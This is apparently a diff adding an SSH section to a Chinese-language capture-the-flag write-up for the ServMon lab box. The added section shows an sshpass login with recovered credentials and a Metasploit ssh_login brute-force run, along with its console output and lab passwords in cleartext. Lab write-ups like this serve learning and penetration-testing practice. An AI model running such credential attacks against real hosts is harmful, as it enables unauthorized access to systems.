@@ -485,4 +485,45 @@ SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:L1k3B1gBu
 SMB         10.129.227.77   445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk
 ```
 ### SSH
+#### Metasploit 和 Windows OpenSSH 的“要 shell 方式”不兼容
 ####  由于SSH正在监听这个Windows盒子，我可以使用它来获取shell：
+```
+[★]$ sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.129.227.77  //没有反应
+
+[★]$ msfconsole
+Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
+platforms using sessions -u <session_id>
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.4.71-dev                          ]
++ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
++ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ssh/ssh_login
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set RHOSTS 10.129.227.77
+RHOSTS => 10.129.227.77
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set USER_FILE users
+USER_FILE => users
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set PASS_FILE passwords
+PASS_FILE => passwords
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> run
+[*] 10.129.227.77:22 - Starting bruteforce
+[+] 10.129.227.77:22 - Success: 'Nadine:L1k3B1gBut7s@W0rk' 'Microsoft Windows [Version 10.0.17763.864]'
+[-] SSH Command Stream encountered an error: Shell/exec channel request failed (Server Version: SSH-2.0-OpenSSH_for_Windows_8.0)
+[*] 10.129.227.77 - SSH session 1 closed.  Reason: Died
+[*] SSH session 1 opened (10.10.14.134:40957 -> 10.129.227.77:22) at 2026-02-09 08:03:51 -0600
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
